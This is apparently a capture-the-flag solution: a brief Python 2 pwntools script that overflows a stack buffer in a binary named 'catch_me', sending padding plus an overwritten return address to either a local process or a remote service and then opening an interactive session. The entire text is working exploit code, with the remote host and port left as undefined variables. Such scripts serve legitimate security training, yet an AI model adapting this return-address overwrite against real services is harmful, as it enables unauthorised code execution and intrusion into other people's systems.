from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./catch_me")
else:
	p = remote(ip,addr)

offset = 0x7fffffffddd8 - 0x7fffffffdcb0
target_addr = 0x400ca0
payload = offset * "a" + p64(target_addr)
p.sendlineafter("show your flag:\n","")
p.sendlineafter("Are you sure?\n",payload)
print p.recv()
p.interactive()
